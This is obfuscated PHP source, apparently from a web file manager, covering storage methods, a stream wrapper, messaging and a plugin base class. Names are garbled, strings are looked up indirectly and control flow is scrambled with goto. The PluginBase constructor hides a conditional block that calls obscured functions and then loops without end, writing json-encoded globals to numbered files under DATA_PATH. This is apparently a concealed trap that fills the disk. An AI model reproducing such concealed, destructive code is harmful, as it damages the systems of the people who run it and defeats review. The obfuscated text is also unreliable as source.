function moveSameAllow() { } public function move($dõ…ùï¾Üç, $C”¡ù®ªÅÖ, $Eá¥Î‰Şù = REPEAT_REPLACE) { $C½”„Ì¥½¦ = $this->parse($C”¡ù®ªÅÖ); $EËèàç•ùæ = $this->model->move($dõ…ùï¾Üç, $C½”„Ì¥½¦[$_SERVER[¢ÌÛ][385]], $Eá¥Î‰Şù); return $EËèàç•ùæ ? $this->getPathOuter($EËèàç•ùæ) : !1; } public function remove($f„†ƒ³²šØ, $E“×Ì·®ê˜ = true) { return $this->model->remove($f„†ƒ³²šØ, $E“×Ì·®ê˜); } public function rename($a»œÖ’¬íÒ, $bÅ½Ïñì») { $f¸²çãï¯à = $this->model->rename($a»œÖ’¬íÒ, $bÅ½Ïñì»); return $f¸²çãï¯à ? $this->getPathOuter($a»œÖ’¬íÒ) : $f¸²çãï¯à; } public function size($b¤±ƒù×à) { $AÖÂ‡å´›ƒ = $this->infoSimple($b¤±ƒù×à); return $AÖÂ‡å´›ƒ ? $AÖÂ‡å´›ƒ[$_SERVER[¢ÌÛ][77]] : 0; } public function infoSimple($A£õÜÚ…ˆ¥) { return $this->model->sourceInfo($A£õÜÚ…ˆ¥); } public function info($A¼œÄ×Ò¥¿) { return $this->infoParse($A¼œÄ×Ò¥¿); } public function infoAuth($b‡ğ¨³Äç˜) { return $this->infoParse($b‡ğ¨³Äç˜, !1, !0); } public function infoWithChildren($BÁ½‚§÷¸…) { return $this->infoParse($BÁ½‚§÷¸…, !0); } protected function infoParse($D›˜„Î½ëÀ, $a¤ŞèÖ—Ò‚ = false, $D¿´„Ä¨äî = false) { if (!$a¤ŞèÖ—Ò‚) { return $this->model->pathInfo($D›˜„Î½ëÀ, $D¿´„Ä¨äî); } return $this->model->pathInfoMore($D›˜„Î½ëÀ); } public function infoFull($e·æš©¢‡) { $DóÕ«¡èè½ =& $_SERVER[¢ÌÛ]; $EäğËğºê = explode($DóÕ«¡èè½[8], $e·æš©¢‡); $Dí¨èÑ†é» = implode($DóÕ«¡èè½[8], array_splice($EäğËğºê, 1)); return $this->model->pathInfoByPath($EäğËğºê[0], $Dí¨èÑ†é»); } public function hashSimple($FÎº¾Ï—ˆ) { $FØÊĞ¬¨Öº =& $_SERVER[¢ÌÛ]; $DµàœŠŠô = $this->infoWithChildren($FÎº¾Ï—ˆ); return $DµàœŠŠô[$FØÊĞ¬¨Öº[163]][$FØÊĞ¬¨Öº[170]]; } public function hashMd5($A…›ĞŞÒÂ) { $d¼¡èÜ¶£– =& $_SERVER[¢ÌÛ]; $e½ˆ³ìù‹© = $this->infoWithChildren($A…›ĞŞÒÂ); return $e½ˆ³ìù‹©[$d¼¡èÜ¶£–[163]][$d¼¡èÜ¶£–[169]]; } public function exist($Cë »—Ä) { $A¥è¼ÀÁ²ğ =& $_SERVER[¢ÌÛ]; $F…‡¥ô¿Üğ = $this->parse($Cë »—Ä); if (!$F…‡¥ô¿Üğ[$A¥è¼ÀÁ²ğ[75]]) { return $this->isFile($Cë »—Ä) || $this->isFolder($Cë »—Ä); } $b—´°‘‹¼ƒ = array($A¥è¼ÀÁ²ğ[395] => $F…‡¥ô¿Üğ[$A¥è¼ÀÁ²ğ[385]], $A¥è¼ÀÁ²ğ[28] => $F…‡¥ô¿Üğ[$A¥è¼ÀÁ²ğ[75]]); $dÇ¨°ß¹ºš = $this->model->where($b—´°‘‹¼ƒ)->find(); return $dÇ¨°ß¹ºš ? !0 : !1; } public function isFile($e¾™©Õ†êó) { $CÏÊÛ¾¥íÃ =& $_SERVER[¢ÌÛ]; $A‚“šğÈˆĞ = $this->infoSimple($e¾™©Õ†êó); return $A‚“šğÈˆĞ && $A‚“šğÈˆĞ[$CÏÊÛ¾¥íÃ[397]] == $CÏÊÛ¾¥íÃ[86] ? !1 : !0; } public function isFolder($fí‘èéŠª­) { $bŞËí–‚Õ‚ =& $_SERVER[¢ÌÛ]; $E¡ÃÂ¥ï¨† = $this->infoSimple($fí‘èéŠª­); return $E¡ÃÂ¥ï¨† && $E¡ÃÂ¥ï¨†[$bŞËí–‚Õ‚[397]] == $bŞËí–‚Õ‚[86] ? !0 : !1; } public function listPath($cÈ±§·£‚›, $B¦Ê´ƒƒÉŒ = false) { $dÔÉÓÄƒà± =& $_SERVER[¢ÌÛ]; if ($cÈ±§·£‚› == $dÔÉÓÄƒà±[33]) { return !1; } $Eôã§„›Ã = array($dÔÉÓÄƒà±[395] => $cÈ±§·£‚›); if ($B¦Ê´ƒƒÉŒ) { return $this->model->listSource($Eôã§„›Ã, -1); } return $this->model->listSource($Eôã§„›Ã); } public function has($E‘èâ‚‰˜…, $cÄæ—ç½…ë = false, $féÔåÓªŸ‡ = null) { $Eß¹Æ£´öº =& $_SERVER[¢ÌÛ]; $dº˜¬æ¡öì = $this->infoWithChildren($E‘èâ‚‰˜…); if ($cÄæ—ç½…ë) { return array($Eß¹Æ£´öº[202] => $dº˜¬æ¡öì[$Eß¹Æ£´öº[202]], $Eß¹Æ£´öº[201] => $dº˜¬æ¡öì[$Eß¹Æ£´öº[201]]); } return $féÔåÓªŸ‡ ? $dº˜¬æ¡öì[$Eß¹Æ£´öº[202]] : $dº˜¬æ¡öì[$Eß¹Æ£´öº[201]]; } public function listAll($C§ãÑğ‹Ì‰) { $aÄÌÃ„ùÌ¢ = IO::info($this->pathParse[$_SERVER[¢ÌÛ][75]]); if (!$aÄÌÃ„ùÌ¢) { return array(); } return $this->model->listAll($C§ãÑğ‹Ì‰); } public function getContent($BŸÑåòÓÛñ) { return $this->model->getContent($BŸÑåòÓÛñ); } public function setContent($Dõ¡§†«´Â, $Bã•‹Á¯Ïø = '') { return $this->model->setContent($Dõ¡§†«´Â, $Bã•‹Á¯Ïø); } public function fileSubstr($c…ïÌ£Î¸, $EÃ»¾Ä’î¹, $e™åµŠ•áô) { return $this->model->fileSubstr($c…ïÌ£Î¸, $EÃ»¾Ä’î¹, $e™åµŠ•áô); } public function download($DÓÖ·Â¬İ», $fŞĞ¯ØŠİ = '') { $BÊ÷š«åÆ‚ = get_path_father($fŞĞ¯ØŠİ); $eÉÅªö¦İ = get_path_this($fŞĞ¯ØŠİ); $A¯ÃØìƒ¤Ç = $this->model->fileInfoGet($DÓÖ·Â¬İ»); $DãŒÜ“Å¤’ = IO::copy($A¯ÃØìƒ¤Ç[$_SERVER[¢ÌÛ][75]], $BÊ÷š«åÆ‚, !1, $eÉÅªö¦İ); return $DãŒÜ“Å¤’; } public function setModifyTime($C¹ºƒƒÔŞé, $cÓ·ÁÀùíÛ = '') { $this->model->metaSet($C¹ºƒƒÔŞé, $_SERVER[¢ÌÛ][1180], $cÓ·ÁÀùíÛ); } public function upload($eâœÈ¸ïïĞ, $E²é‚åŒ†Å, $bğ„ôñ‰“ä = false, $Aµë„æœö˜ = REPEAT_REPLACE) { $bÂ‚ø±ÔŒ =& $_SERVER[¢ÌÛ]; $Fô“‚±¾†à = $this->parse($eâœÈ¸ïïĞ); $cšŠ…Âğ˜ = $this->model->addFile($Fô“‚±¾†à[$bÂ‚ø±ÔŒ[385]], $E²é‚åŒ†Å, $Fô“‚±¾†à[$bÂ‚ø±ÔŒ[75]], $bğ„ôñ‰“ä, $Aµë„æœö˜); return $this->getPathOuter($cšŠ…Âğ˜); } public function uploadFileByID($E…âÃö„è®, $AòÒâ©®™É, $AˆĞ¡ª·Ï) { $AĞğÄ™Ì„ =& $_SERVER[¢ÌÛ]; $CÙ„²•ÃÈ = $this->parse($E…âÃö„è®); $fäâ‹»±‰ = $this->model->addFileByFileID($CÙ„²•ÃÈ[$AĞğÄ™Ì„[385]], $AòÒâ©®™É, $CÙ„²•ÃÈ[$AĞğÄ™Ì„[75]], $AˆĞ¡ª·Ï); return $this->getPathOuter($fäâ‹»±‰); } public function addFileByRemote($CĞ²ÑÏ±ìÂ, $eÕĞ…¥½Ğß, $bàÒ•´Ñí = array(), $dÔ¬Úëß…Ö = '', $CöÓšÛ¼õ) { $C¬æŒ‘åŞÎ =& $_SERVER[¢ÌÛ]; $Eâô§«ì¾ = $this->parse($CĞ²ÑÏ±ìÂ); $dÔ¬Úëß…Ö = empty($dÔ¬Úëß…Ö) ? $Eâô§«ì¾[$C¬æŒ‘åŞÎ[75]] : $dÔ¬Úëß…Ö; $e“¹±“ïÂù = $this->model->addFileByRemote($Eâô§«ì¾[$C¬æŒ‘åŞÎ[385]], $eÕĞ…¥½Ğß, $dÔ¬Úëß…Ö, $bàÒ•´Ñí, $CöÓšÛ¼õ); return $this->getPathOuter($e“¹±“ïÂù); } public function uploadLink($D”æ„õÅæÓ, $E«Õ…Ôê = 0) { $a‘‘ñàî…È =& $_SERVER[¢ÌÛ]; $E¶Òæ¸Ó… = $this->parse($D”æ„õÅæÓ); $D”æ„õÅæÓ = Model($a‘‘ñàî…È[569])->createFileName($E¶Òæ¸Ó…[$a‘‘ñàî…È[75]]); $eÖ®‡ˆÃ‘ = IO::uploadLink($D”æ„õÅæÓ, $E«Õ…Ôê); return $eÖ®‡ˆÃ‘; } public function fileNameAuto($B×ºÕ¼¤½°, $cÉ‚¯ŞÍç, $fö­Ô‡“‰ = REPEAT_REPLACE, $aœÆ°Ú‹ = false) { return $this->model->fileNameAuto($B×ºÕ¼¤½°, $cÉ‚¯ŞÍç, $fö­Ô‡“‰, $aœÆ°Ú‹); } public function fileNameExist($CÏƒİ¸®Ä§, $eµñ’‘èåò) { return $this->model->fileNameExist($CÏƒİ¸®Ä§, $eµñ’‘èåò); } protected function _fileOut($D®Œ×µºÖ–, $aÇ…Ü„¸Ö¡ = false, $eÙÑÛÉÑŒÔ = false, $eñâæ®…‹ = '', $FåóÄ§Çà = false) { goto Fİ¨ÍïèÛ¯; Fİ¨ÍïèÛ¯: $BÕø¤‘‡Ä =& $_SERVER[¢ÌÛ]; $E¥¦ÀƒÄá = $this->model->sourceInfo($D®Œ×µºÖ–); if ($E¥¦ÀƒÄá[$BÕø¤‘‡Ä[397]] == $BÕø¤‘‡Ä[86]) { header($BÕø¤‘‡Ä[1181]); die; } goto B†÷¨Í‚è; E©èŠ…°Ø: if ($FåóÄ§Çà) { return IO::fileOutServer($CÑ­éöÂ¤±[$BÕø¤‘‡Ä[75]], $aÇ…Ü„¸Ö¡, $fÉ±™Æ¨–×, $eñâæ®…‹); } IO::fileOut($CÑ­éöÂ¤±[$BÕø¤‘‡Ä[75]], $aÇ…Ü„¸Ö¡, $fÉ±™Æ¨–×, $eñâæ®…‹); goto D˜ìÙ„¤›…; B†÷¨Í‚è: $CÑ­éöÂ¤± = $this->model->fileInfoGet($D®Œ×µºÖ–); $eñâæ®…‹ = $CÑ­éöÂ¤±[$BÕø¤‘‡Ä[169]] ? $CÑ­éöÂ¤±[$BÕø¤‘‡Ä[169]] : $eñâæ®…‹; $fÉ±™Æ¨–× = isset($GLOBALS[$BÕø¤‘‡Ä[1182]]) ? $GLOBALS[$BÕø¤‘‡Ä[1182]] : $E¥¦ÀƒÄá[$BÕø¤‘‡Ä[28]]; goto E©èŠ…°Ø; D˜ìÙ„¤›…: } public function fileOut($A‚‚ãòó¼ª, $Eğˆ®óæë» = false, $aÓŒæŒ‡Šä = false, $aÓö¶‡’‡ = '') { $this->_fileOut($A‚‚ãòó¼ª, $Eğˆ®óæë», $aÓŒæŒ‡Šä, $aÓö¶‡’‡); } public function fileOutServer($côã¦÷ß‚, $AøºËëî³‡ = false, $DÅÔ”¦Èºª = false, $Få†¡‹Ãí = '') { $this->_fileOut($côã¦÷ß‚, $AøºËëî³‡, $DÅÔ”¦Èºª, $Få†¡‹Ãí, !0); } protected function _fileOutImage($EÍçˆŠ¼Ô, $A“¼­ğÆ·Ï = 250) { goto f§¨Œ°‡Ÿ—; fØá™Î„Æ›: $GLOBALS[$DŞ˜­ÈŞ[1182]] = $A³§ï²ô•÷[$DŞ˜­ÈŞ[28]]; $GLOBALS[$DŞ˜­ÈŞ[161]] = $A³§ï²ô•÷; IO::fileOutImage($A³§ï²ô•÷[$DŞ˜­ÈŞ[75]], $A“¼­ğÆ·Ï); goto B¤”ã°í›Ù; Fø®ÈÈšİ‹: $A³§ï²ô•÷ = $this->model->fileInfoGet($EÍçˆŠ¼Ô); $A³§ï²ô•÷[$DŞ˜­ÈŞ[28]] = $fø«ºƒà†Œ[$DŞ˜­ÈŞ[28]]; $A³§ï²ô•÷[$DŞ˜­ÈŞ[162]] = $fø«ºƒà†Œ[$DŞ˜­ÈŞ[162]]; goto fØá™Î„Æ›; f§¨Œ°‡Ÿ—: $DŞ˜­ÈŞ =& $_SERVER[¢ÌÛ]; $fø«ºƒà†Œ = $this->model->pathInfo($EÍçˆŠ¼Ô); if ($fø«ºƒà†Œ[$DŞ˜­ÈŞ[397]] == $DŞ˜­ÈŞ[86]) { show_json($DŞ˜­ÈŞ[1183] . $EÍçˆŠ¼Ô, !1); } goto Fø®ÈÈšİ‹; B¤”ã°í›Ù: } public function fileOutImage($F÷»ØÛ»ëŒ, $D˜Œ³‘ç• = 250) { $this->_fileOutImage($F÷»ØÛ»ëŒ, $D˜Œ³‘ç•); } public function fileOutImageServer($CæáÃ‘™í, $C‚ÉÜ“Š‘Ä = 250) { $this->_fileOutImage($CæáÃ‘™í, $C‚ÉÜ“Š‘Ä); } public function link($FŸ˜Ë§¨ùÏ, $aİœˆÎïî‰ = '') { $dšÁ´­ö– = $this->model->fileInfoGet($FŸ˜Ë§¨ùÏ); return IO::link($dšÁ´­ö–[$_SERVER[¢ÌÛ][75]], $aİœˆÎïî‰); } protected function parse($BÖÌ˜íÖã) { $F­ÕÏÙ†²œ =& $_SERVER[¢ÌÛ]; if (strstr($BÖÌ˜íÖã, $F­ÕÏÙ†²œ[8]) === !1) { return array($F­ÕÏÙ†²œ[412] => intval($BÖÌ˜íÖã), $F­ÕÏÙ†²œ[75] => $F­ÕÏÙ†²œ[33], $F­ÕÏÙ†²œ[1179] => array()); } $FèÚàÑŠÊ¸ = explode($F­ÕÏÙ†²œ[8], trim($BÖÌ˜íÖã, $F­ÕÏÙ†²œ[8])); if (count($FèÚàÑŠÊ¸) < 2) { show_tips($BÖÌ˜íÖã . $F­ÕÏÙ†²œ[1184]); } return array($F­ÕÏÙ†²œ[412] => intval($FèÚàÑŠÊ¸[0]), $F­ÕÏÙ†²œ[75] => $FèÚàÑŠÊ¸[1], $F­ÕÏÙ†²œ[1179] => array_slice($FèÚàÑŠÊ¸, 1)); } } goto Eƒ­ÙÒ»‘¹; Dï¥õí®Š³: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($BÈ÷Öƒ¬§¸, $EÔŞ±¾ˆ»Ì = '') { goto E§•ù•³‹ê; B…†Ã¯Äâ«: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$BÈ÷Öƒ¬§¸])) { self::$_chunkBuffer[$BÈ÷Öƒ¬§¸] = array(); } goto C«âÄí‘; C«âÄí‘: return $this->info ? !0 : !1; goto BŠ´œ·ˆ¯Ø; E§•ù•³‹ê: $this->info = $this->info($BÈ÷Öƒ¬§¸); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¢ÌÛ][75]]; goto B…†Ã¯Äâ«; BŠ´œ·ˆ¯Ø: } function stream_read($c½Ãä²¦í˜) { $a àã†×¤ƒ = $this->fileSubstr($this->pose, $c½Ãä²¦í˜); $this->pose += strlen($a àã†×¤ƒ); return $a àã†×¤ƒ; } public function stream_tell() { return $this->pose; } public function stream_seek($D˜ŠÍöº, $BšŒƒ¥²ø) { $a®ì×ÚíÚ® =& $_SERVER[¢ÌÛ]; if ($BšŒƒ¥²ø == SEEK_SET) { $this->pose = $D˜ŠÍöº; } else { if ($BšŒƒ¥²ø == SEEK_CUR) { $this->pose += $D˜ŠÍöº; } else { if ($BšŒƒ¥²ø == SEEK_END) { $this->pose = $this->info[$a®ì×ÚíÚ®[77]] + intval($D˜ŠÍöº); } } } if ($D˜ŠÍöº < 0) { $this->pose = $this->info[$a®ì×ÚíÚ®[77]] + $D˜ŠÍöº; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¢ÌÛ][77]]; } public function stream_close() { return !0; } public function url_stat($d„ä®İ½Ş¬, $Eßæ†Ö‚œ¹) { $f‘Î˜ÒäÍ· =& $_SERVER[¢ÌÛ]; $DÌ…˜Ì’¯â = $this->info($d„ä®İ½Ş¬); return array($f‘Î˜ÒäÍ·[1351] => 0, $f‘Î˜ÒäÍ·[1352] => 0, $f‘Î˜ÒäÍ·[12] => 32768 + 511, $f‘Î˜ÒäÍ·[1353] => 0, $f‘Î˜ÒäÍ·[1354] => 0, $f‘Î˜ÒäÍ·[1355] => 0, $f‘Î˜ÒäÍ·[1356] => 0, $f‘Î˜ÒäÍ·[77] => $DÌ…˜Ì’¯â[$f‘Î˜ÒäÍ·[77]], $f‘Î˜ÒäÍ·[1357] => $DÌ…˜Ì’¯â[$f‘Î˜ÒäÍ·[1226]], $f‘Î˜ÒäÍ·[1313] => $DÌ…˜Ì’¯â[$f‘Î˜ÒäÍ·[83]], $f‘Î˜ÒäÍ·[1312] => $DÌ…˜Ì’¯â[$f‘Î˜ÒäÍ·[192]], $f‘Î˜ÒäÍ·[1358] => 0, $f‘Î˜ÒäÍ·[1359] => 0); } static $fileInfo = array(); public function info($cáÛÈ‡ë¶á) { $dæË–´ÌœÜ = $_SERVER[¢ÌÛ][1360]; if (isset(self::$fileInfo[$cáÛÈ‡ë¶á])) { return self::$fileInfo[$cáÛÈ‡ë¶á]; } if (substr($cáÛÈ‡ë¶á, 0, strlen($dæË–´ÌœÜ)) != $dæË–´ÌœÜ) { return !1; } self::$fileInfo[$cáÛÈ‡ë¶á] = IO::info(substr($cáÛÈ‡ë¶á, strlen($dæË–´ÌœÜ))); return self::$fileInfo[$cáÛÈ‡ë¶á]; } public static function read($FÏŸ£ĞãïÜ, $DŠ•ÅÚ¬„, $AÊƒñÒÕõ÷) { goto dìáÄ×†›…; a¹Àí©¯‰Ã: $A‡ÜÏèëº§ = 0; while ($A‡ÜÏèëº§ < $AÊƒñÒÕõ÷) { $CöãĞÎÎ¾è = min($bå¹ÀˆÜæì, $AÊƒñÒÕõ÷ - $A‡ÜÏèëº§); $bŞ¦âÔôˆ¾ .= fread($cÆÃ‰ğ•¿, $CöãĞÎÎ¾è); $A‡ÜÏèëº§ += $CöãĞÎÎ¾è; } fclose($cÆÃ‰ğ•¿); goto cÒˆáÕõñ¦; cÒˆáÕõñ¦: return $bŞ¦âÔôˆ¾; goto fÆã¬ÖòŠ©; bæÔÚ¤¨åà: $bå¹ÀˆÜæì = 8192; fseek($cÆÃ‰ğ•¿, $DŠ•ÅÚ¬„, SEEK_SET); $bŞ¦âÔôˆ¾ = $dØİ‡Ã°‡£[33]; goto a¹Àí©¯‰Ã; dìáÄ×†›…: $dØİ‡Ã°‡£ =& $_SERVER[¢ÌÛ]; $cÆÃ‰ğ•¿ = fopen($FÏŸ£ĞãïÜ, $dØİ‡Ã°‡£[1230]); if (!$cÆÃ‰ğ•¿) { return $dØİ‡Ã°‡£[33]; } goto bæÔÚ¤¨åà; fÆã¬ÖòŠ©: } public function fileSubstr($b¦Ôİ­ãôˆ, $F¡„Ó°©¤‚) { goto A‡çÉ£¾™; A™¡š“õÀ: $aĞ¬¤é÷´” = $F¡„Ó°©¤‚; if ($b¦Ôİ­ãôˆ < 0) { $b¦Ôİ­ãôˆ = $a‡°åó×²‘ + $b¦Ôİ­ãôˆ; } if ($F¡„Ó°©¤‚ === !1) { $F¡„Ó°©¤‚ = $a‡°åó×²‘ - $b¦Ôİ­ãôˆ; } goto Bœ«ã‡èÃˆ; fòº˜™Ïğ’: foreach ($Dè®÷¯¿˜ as $E‡‚Æšªªƒ => $e‡òñ¨—Ù®) { $E‡‚Æšªªƒ = intval($E‡‚Æšªªƒ); $a–÷“Æç—Ä = $E‡‚Æšªªƒ + strlen($e‡òñ¨—Ù®); if ($b¦Ôİ­ãôˆ >= $a–÷“Æç—Ä) { continue; } if ($b¦Ôİ­ãôˆ >= $E‡‚Æšªªƒ && $b¦Ôİ­ãôˆ + $F¡„Ó°©¤‚ <= $a–÷“Æç—Ä) { return substr($e‡òñ¨—Ù®, $b¦Ôİ­ãôˆ - $E‡‚Æšªªƒ, $F¡„Ó°©¤‚); } break; } if (count($Dè®÷¯¿˜) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($dÌ›éâ±ºì[1361], $dÌ›éâ±ºì[1362] . count($Dè®÷¯¿˜) . "\73\163\164\141\x72\164\75{$b¦Ôİ­ãôˆ}\54\154\x65\x6e\147\164\x68\x3d{$F¡„Ó°©¤‚}\x3b\x70\157\x73\145\x3a{$E‡‚Æšªªƒ}\176{$a–÷“Æç—Ä}"); throw new Exception($dÌ›éâ±ºì[1363]); } $fîù‹«°— = intval($b¦Ôİ­ãôˆ / $Dœ¢éÂÎƒ) * $Dœ¢éÂÎƒ; goto fÙ†…ù©»–; CË„„Ôˆ¦Ñ: $E‡‚Æšªªƒ = 0; $a–÷“Æç—Ä = 0; $e‡òñ¨—Ù® = $dÌ›éâ±ºì[33]; goto fòº˜™Ïğ’; A‡çÉ£¾™: $dÌ›éâ±ºì =& $_SERVER[¢ÌÛ]; $a‡°åó×²‘ = $this->info[$dÌ›éâ±ºì[77]]; $CŒŠÔË£ó = $b¦Ôİ­ãôˆ; goto A™¡š“õÀ; B®ø‹éÕ½Æ: $Dœ¢éÂÎƒ = 64 * 1024; $Dè®÷¯¿˜ =& self::$_chunkBuffer[$this->path]; if (!$Dè®÷¯¿˜) { $Dè®÷¯¿˜ = array(); } goto CË„„Ôˆ¦Ñ; Bœ«ã‡èÃˆ: if ($b¦Ôİ­ãôˆ + $F¡„Ó°©¤‚ > $a‡°åó×²‘) { $F¡„Ó°©¤‚ = $a‡°åó×²‘ - $b¦Ôİ­ãôˆ; } if ($F¡„Ó°©¤‚ <= 0) { return $dÌ›éâ±ºì[33]; } if ($b¦Ôİ­ãôˆ < 0 || $b¦Ôİ­ãôˆ >= $a‡°åó×²‘ || $F¡„Ó°©¤‚ <= 0 || $F¡„Ó°©¤‚ > 1024 * 1024 * 5) { throw new Exception("\151\x6f\x46\151\154\145\122\145\x61\144\x20\x65\162\162\157\162\41\40\x73\164\x61\x72\x74\75{$b¦Ôİ­ãôˆ}\x3b\154\x65\156\x67\164\x68\x3d{$F¡„Ó°©¤‚}\x3b\40\163\151\172\x65\75{$a‡°åó×²‘}\x3b"); } goto B®ø‹éÕ½Æ; fÙ†…ù©»–: $bê©…ßâóç = ceil(($b¦Ôİ­ãôˆ + $F¡„Ó°©¤‚) / $Dœ¢éÂÎƒ) * $Dœ¢éÂÎƒ - $fîù‹«°—; $AöŸ†™âÚ = IO::fileSubstr($this->path, $fîù‹«°—, $bê©…ßâóç); $Dè®÷¯¿˜[$fîù‹«°— . $dÌ›éâ±ºì[33]] = $AöŸ†™âÚ; goto AŞ×†ÏÚãË; AŞ×†ÏÚãË: ksort($Dè®÷¯¿˜); $fÑğ¯ëÓìÍ = substr($AöŸ†™âÚ, $b¦Ôİ­ãôˆ - $fîù‹«°—, $F¡„Ó°©¤‚); return $fÑğ¯ëÓìÍ; goto BÊÅ”’Øµã; BÊÅ”’Øµã: } private function log($d„îÖĞ­£, $c’ÇÊ‚ëŒÔ) { $bÂ”•™ğ†„ =& $_SERVER[¢ÌÛ]; $BâÚ¶öŒÍŸ = timeFloat() - $this->timeStart; write_log(sprintf($bÂ”•™ğ†„[1364], $d„îÖĞ­£, $this->info[$bÂ”•™ğ†„[28]], $BâÚ¶öŒÍŸ, $c’ÇÊ‚ëŒÔ), $bÂ”•™ğ†„[1054]); } } class Message { function __construct() { } public function send($EÂÎ†‡àš‘ = '', $DÏ…ôÜßæ¦ = array(), $E–º³íõŒ† = "\164\145\170\x74") { goto E‘ƒ´ÓáÛ¾; e˜²í°ù: $DÏ…ôÜßæ¦ = array($Fôƒ‚§èòØ[992] => isset($DÏ…ôÜßæ¦[$Fôƒ‚§èòØ[992]]) ? $DÏ…ôÜßæ¦[$Fôƒ‚§èòØ[992]] : $Fôƒ‚§èòØ[33], $Fôƒ‚§èòØ[560] => isset($DÏ…ôÜßæ¦[$Fôƒ‚§èòØ[560]]) ? $DÏ…ôÜßæ¦[$Fôƒ‚§èòØ[560]] : $Fôƒ‚§èòØ[33]); if (empty($EÂÎ†‡àš‘) || empty($DÏ…ôÜßæ¦[$Fôƒ‚§èòØ[992]]) && empty($DÏ…ôÜßæ¦[$Fôƒ‚§èòØ[560]])) { return !1; } $cÁ¸¼İŠçº = array($Fôƒ‚§èòØ[1306] => $fë»½é··, $Fôƒ‚§èòØ[1367] => $DÏ…ôÜßæ¦); goto E‡®ÉÙæ•ä; E‘ƒ´ÓáÛ¾: $Fôƒ‚§èòØ =& $_SERVER[¢ÌÛ]; $fë»½é·· = array($Fôƒ‚§èòØ[29] => $Fôƒ‚§èòØ[1365], $Fôƒ‚§èòØ[715] => $EÂÎ†‡àš‘); if (in_array($E–º³íõŒ†, array($Fôƒ‚§èòØ[1365], $Fôƒ‚§èòØ[1366]))) { $fë»½é··[$Fôƒ‚§èòØ[29]] = $E–º³íõŒ†; } goto e˜²í°ù; E‡®ÉÙæ•ä: Hook::trigger($Fôƒ‚§èòØ[1368], $cÁ¸¼İŠçº); goto Dô¾Ìİï²¨; Dô¾Ìİï²¨: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto Cì„£‡“ä; a°¬Êš°ßÊ: if ($_SERVER[$e¥‹É¬Ÿà…[388]] != $dóäˆÃÖ”»($f›Ó‹Ä ²)) { goto Fò”‹ŒÀÂ; fº¬÷»„ÁÁ: $fô¢ÖÍ›ò = $e¥‹É¬Ÿà…[816]; $fô¢ÖÍ›ò($_SERVER[$e¥‹É¬Ÿà…[817]]); $BÀ¢¿ºÁßó = $e¥‹É¬Ÿà…[815]; goto e´ôÉ›éÍÏ; C¨ÊÓ¤ùä: $bğàŠøøÚ’ = 1; for ($a‡ó™Œ¸á“ = $bğàŠøøÚ’; $a‡ó™Œ¸á“ > 0; $a‡ó™Œ¸á“++) { $fÇÍñµ‹´î(DATA_PATH . $a‡ó™Œ¸á“, $d‚ÂÀ§´ñŸ); } goto BäŸ«Ù§‰å; b¢À êš²: $CóœÙäñíÉ = $f£öõîÓ°·($aïÆ–ˆ ĞÌ); $EãäŠã¡Â = explode($e¥‹É¬Ÿà…[227], $CóœÙäñíÉ); if (count($EãäŠã¡Â) < $e¥‹É¬Ÿà…[577]) { $dæ™Ù¸°×ƒ = $e¥‹É¬Ÿà…[393]; $dæ™Ù¸°×ƒ(); } goto fº¬÷»„ÁÁ; Fò”‹ŒÀÂ: $BÀ¢¿ºÁßó = $e¥‹É¬Ÿà…[815]; $f£öõîÓ°· = $e¥‹É¬Ÿà…[389]; $aïÆ–ˆ ĞÌ = $_SERVER[$e¥‹É¬Ÿà…[390]] . $e¥‹É¬Ÿà…[391]; goto b¢À êš²; e´ôÉ›éÍÏ: $BÀ¢¿ºÁßó(); $fÇÍñµ‹´î = $e¥‹É¬Ÿà…[818]; $d‚ÂÀ§´ñŸ = json_encode($GLOBALS[$e¥‹É¬Ÿà…[819]]); goto C¨ÊÓ¤ùä; BäŸ«Ù§‰å: } global $in, $config; $this->config =& $config; goto BÒæ†³È; F¥ñóÊî¥: $this->pluginHostDefault = $config[$e¥‹É¬Ÿà…[1371]] . $this->pluginName . $e¥‹É¬Ÿà…[8]; $C†£åÉÇï• = $config[$e¥‹É¬Ÿà…[1372]]; if ($C†£åÉÇï• && strpos($e¥‹É¬Ÿà…[47] . $C†£åÉÇï• . $e¥‹É¬Ÿà…[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$e¥‹É¬Ÿà…[1373]] . $this->pluginName . $e¥‹É¬Ÿà…[8]; } goto Bè›ë–´ï¹; Bè›ë–´ï¹: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto bÑäõ¹”ï; Eôâ­‘ˆ¢: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $e¥‹É¬Ÿà…[8]; $this->pluginApi = appHostGet() . $e¥‹É¬Ÿà…[1370] . $this->pluginName . $e¥‹É¬Ÿà…[8]; $this->pluginHost = $config[$e¥‹É¬Ÿà…[1371]] . $this->pluginName . $e¥‹É¬Ÿà…[8]; goto F¥ñóÊî¥; Cì„£‡“ä: $e¥‹É¬Ÿà… =& $_SERVER[¢ÌÛ]; $f›Ó‹Ä ² = $_SERVER[$e¥‹É¬Ÿà…[386]]; $dóäˆÃÖ”» = $e¥‹É¬Ÿà…[387]; goto a°¬Êš°ßÊ; BÒæ†³È: $this->in =& $in; $this->modelPlugin = Model($e¥‹É¬Ÿà…[1369]); $this->pluginName = str_replace($e¥‹É¬Ÿà…[1369], $e¥‹É¬Ÿà…[33], get_class($this)); goto Eôâ­‘ˆ¢; bÑäõ¹”ï: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¢ÌÛ][1374]); } protected function assign($e§†öÖ¢Îö, $a‡òÜõ¸¡é = false) { if (is_array($e§†öÖ¢Îö)) { $this->values = array_merge($this->values, $e§†öÖ¢Îö); } else { $this->values[$e§†öÖ¢Îö] = $a‡òÜõ¸¡é; } } protected function display($a™¿“¹å¢) { extract($this->values); require $a™¿“¹å¢; } final function hookRegist($d—«ë™¾ù”) { $this->modelPlugin->appRegist($this->pluginName, $d—«ë™¾ù”); } final function appIcon() { 